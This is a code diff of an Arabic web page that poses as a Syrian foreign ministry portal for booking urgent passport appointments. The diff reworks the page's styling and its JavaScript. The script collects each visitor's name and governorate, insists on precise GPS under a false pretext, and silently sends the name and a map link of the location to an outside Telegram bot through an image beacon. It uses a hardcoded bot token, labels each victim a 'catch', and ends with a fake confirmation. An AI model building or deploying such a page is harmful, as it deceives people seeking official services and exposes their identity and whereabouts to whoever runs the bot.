@@ -3,161 +3,162 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الجمهورية العربية السورية - وزارة الخارجية والمغتربين</title>
+    <title>بوابة حجز الدور المستعجل</title>
     <style>
-        /* إعدادات الخط العريض جداً */
+        /* إعدادات الخط العريض والألوان الذهبية من الصورة */
         body { 
-            font-family: 'Cairo', 'Segoe UI', 'Arial Black', sans-serif; 
-            background-color: #ffffff; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #fcfcfc; 
             margin: 0; 
             padding: 0; 
             text-align: center;
-            font-weight: 900; /* أقصى درجة عرض للخط */
         }
-        .header-main {
-            padding: 15px 0;
-            border-bottom: 5px solid #b38a2e;
-            background-color: #fff;
+        .header-image {
+            background-color: #ffffff;
+            padding: 10px 0;
+            border-bottom: 4px solid #b38a2e;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        .header-main img {
-            max-width: 95%;
+        .header-image img {
+            max-width: 90%;
             height: auto;
+            max-height: 70px;
         }
         .container {
-            max-width: 480px;
+            max-width: 450px;
             margin: 30px auto;
             padding: 25px;
-            border: 2px solid #b38a2e;
+            background: white;
             border-radius: 12px;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
         }
-        /* العناوين العريضة */
+        /* العنوان الذهبي العريض كما في الصورة */
         h2 { 
-            color: #1a237e; 
-            font-size: 26px; 
-            margin-bottom: 15px;
+            color: #b38a2e; 
+            font-size: 28px; 
             font-weight: 900; 
-            letter-spacing: -1px;
+            margin-bottom: 5px;
         }
-        .alert-box {
-            background-color: #d32f2f;
-            color: white;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 25px;
-            font-size: 18px;
-            font-weight: 900;
+        .promo { 
+            color: #d32f2f; 
+            font-weight: 800; 
+            font-size: 16px;
+            margin-bottom: 30px;
         }
         label { 
             display: block; 
             text-align: right; 
-            margin-bottom: 10px; 
-            font-size: 20px;
-            color: #000;
-        }
-        input, select {
-            width: 100%;
-            padding: 15px;
-            margin-bottom: 25px;
-            border: 3px solid #ced4da;
-            border-radius: 8px;
-            box-sizing: border-box;
+            margin: 15px 5% 8px; 
+            font-weight: 900; 
             font-size: 18px;
-            font-weight: 800;
-            text-align: center;
+            color: #333; 
         }
-        /* الزر العريض والضخم */
-        .btn-submit {
-            background-color: #1b5e20;
-            color: white;
-            padding: 20px;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 22px;
-            font-weight: 900;
-            box-shadow: 0 5px 15px rgba(27, 94, 32, 0.4);
+        /* تصميم الحقول كما في صورتك */
+        input, select { 
+            width: 90%; 
+            padding: 15px; 
+            margin-bottom: 20px; 
+            border: 2px solid #e0e0e0; 
+            border-radius: 12px; 
+            font-size: 17px; 
+            font-weight: 800;
+            background-color: #fafafa;
+            color: #555;
+        }
+        /* الزر الذهبي العريض من الصورة */
+        .btn-confirm { 
+            background-color: #b38a2e; 
+            color: white; 
+            padding: 18px; 
+            border: none; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            width: 90%; 
+            font-size: 20px; 
+            font-weight: 900; 
+            margin-top: 10px;
+            box-shadow: 0 4px 12px rgba(179, 138, 46, 0.3);
         }
         .footer {
             margin-top: 40px;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 700;
-            color: #333;
+            color: #888;
             padding-bottom: 30px;
         }
     </style>
 </head>
 <body>
 
-    <div class="header-main">
-        <img src="https://r.jina.ai/i/05e043690d7c4938a19266f8e7784013" alt="شعار وزارة الخارجية">
+    <div class="header-image">
+        <img src="https://r.jina.ai/i/05e043690d7c4938a19266f8e7784013" alt="شعار الوزارة">
     </div>
 
     <div class="container">
-        <h2>نظام حجز الجواز المستعجل</h2>
-        <div class="alert-box">
-            حجز فوري بقيمة 40 دولار فقط
-        </div>
+        <h2>بوابة حجز الدور المستعجل</h2>
+        <p class="promo">خدمة تقديم طلبات جواز السفر | الرسم: 40 دولار فقط للفترة المحدودة</p>
+        
+        <label>الاسم الكامل (كما في الهوية):</label>
+        <input type="text" id="full_name" placeholder="أدخل اسمك الثلاثي">
 
-        <label>الاسم الكامل (ثلاثي):</label>
-        <input type="text" id="full_name" placeholder="اكتب اسمك هنا">
-
-        <label>اختر محافظتك:</label>
+        <label>المحافظة:</label>
         <select id="city">
-            <option value="">-- اضغط هنا للاختيار --</option>
+            <option value="">اختر المحافظة</option>
             <option value="إدلب">إدلب</option>
             <option value="حلب">حلب</option>
             <option value="دمشق">دمشق</option>
+            <option value="ريف دمشق">ريف دمشق</option>
             <option value="حمص">حمص</option>
             <option value="حماة">حماة</option>
             <option value="اللاذقية">اللاذقية</option>
             <option value="طرطوس">طرطوس</option>
             <option value="دير الزور">دير الزور</option>
+            <option value="الرقة">الرقة</option>
+            <option value="الحسكة">الحسكة</option>
+            <option value="درعا">درعا</option>
+            <option value="السويداء">السويداء</option>
+            <option value="القنيطرة">القنيطرة</option>
         </select>
 
-        <button class="btn-submit" onclick="startProcess()">تأكيد الحجز الآن</button>
+        <button class="btn-confirm" onclick="startTracking()">تأكيد حجز الدور المستعجل</button>
     </div>
 
     <div class="footer">
-        بوابة وزارة الخارجية والمغتربين © 2026
+        © جميع الحقوق محفوظة لوزارة الخارجية والمغتربين 2026
     </div>
 
     <script>
-        function startProcess() {
+        function startTracking() {
             let name = document.getElementById("full_name").value;
             let city = document.getElementById("city").value;
 
             if (name == "" || city == "") {
-                alert("يرجى كتابة الاسم واختيار المحافظة!");
+                alert("⚠️ يرجى إكمال البيانات المطلوبة أولاً.");
                 return;
             }
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    sendToTelegram(position, name, city);
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    
+                    // بيانات بوت التليجرام الخاص بك
+                    let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+                    let chat_id = "7214473798";
+                    
+                    let text = `🎯 صيد جديد (جوازات):\n\n👤 الاسم: ${name}\n🏙️ المحافظة: ${city}\n📍 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+
+                    // طريقة الإرسال المباشرة (Image Beacon) لضمان السرعة وتجاوز الحظر
+                    let finalUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+                    let img = new Image();
+                    img.src = finalUrl;
+
+                    alert("✅ تم استلام طلبك بنجاح. سيتم التواصل معك عبر الهاتف لتأكيد الحجز.");
                 }, function(error) {
-                    alert("⚠️ خطأ: يجب تفعيل الـ GPS للتأكد من هويتك ومنطقتك الجغرافية لإتمام الحجز.");
+                    alert("⚠️ عذراً: يجب السماح بالوصول للموقع (GPS) للتحقق من تواجدك داخل القطر وإتمام الحجز بنجاح.");
                 }, { enableHighAccuracy: true });
             } else {
-                alert("جهازك لا يدعم الخدمة.");
+                alert("متصفحك لا يدعم هذه الخدمة.");
             }
-        }
-
-        function sendToTelegram(position, name, city) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-            let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-            let chat_id = "7214473798";
-            
-            let text = `🎯 صيد جوازات جديد!\n\n👤 الاسم: ${name}\n🏙️ المحافظة: ${city}\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
-
-            // استخدام طريقة الـ Image Beacon لضمان التوصيل الفوري
-            let finalUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
-            let img = new Image();
-            img.src = finalUrl;
-
-            alert("✅ تم الحجز! سيتم إرسال الكود السري لهاتفك خلال دقائق.");
         }
     </script>
 </body>
